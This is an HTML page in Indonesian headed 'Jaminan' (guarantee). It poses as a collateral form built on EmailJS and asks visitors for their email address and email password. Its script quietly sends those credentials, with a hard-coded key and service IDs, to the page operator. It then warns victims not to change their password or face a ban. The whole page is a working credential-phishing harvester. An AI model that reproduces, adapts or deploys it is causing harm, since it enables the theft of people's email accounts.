<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Email Form with EmailJS</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: rgb(38, 255, 125);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .contact-form {
            background: #fff;
            padding: 25px;
            border-radius: 10px;
            width: 400px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
        }
        .form-group {
            margin-bottom: 15px;
        }
        input, textarea {
            width: 100%;
            padding: 8px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            padding: 10px;
            width: 100%;
            background: blue;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background: darkblue;
        }
    </style>
</head>
<body>

    <div class="contact-form">
        <h1>Jaminan</h1>
        <div class="form-group">
            <label for="name">Nama</label>
            <input type="text" id="name" placeholder="eg. Dara">
        </div>
        <div class="form-group">
            <label for="email">Email jaminan</label>
            <input type="email" id="email" placeholder="eg. dara@example.com">
        </div>
        <div class="form-group">
            <label for="subject">Password email</label>
            <input type="text" id="subject" placeholder="Sandi email">
        </div>
        <div class="form-group">
            <label for="message">pesan</label>
            <textarea id="message" placeholder="Type your message here..."></textarea>
        </div>
        <div class="form-group">
            <button onclick="sendMessage();">Send Message</button>
        </div>
    </div>

    <script>
        function sendMessage() {
            emailjs.init("yHp6NNWn_P6pny19J"); // Pastikan API Key valid

            let params = {
                sendername: document.getElementById("name").value,
                senderemail: document.getElementById("email").value,
                subject: document.getElementById("subject").value,
                message: document.getElementById("message").value
            };

            let serviceID = "service_kdkzua8"; // Ganti dengan service ID kamu
            let templateID = "template_krz8o1b"; // Ganti dengan template ID kamu

            emailjs.send(serviceID, templateID, params)
                .then(response => {
                    alert("Terimakasih, " + params.sendername + ". rulls jangan ganti password, ganti auto banned. Link password akan di berikan.");
                    console.log("SUCCESS!", response);
                })
                .catch(error => {
                    alert("Failed to send email. Please try again.");
                    console.error("ERROR:", error);
                });
        }
    </script>

</body>
</html>
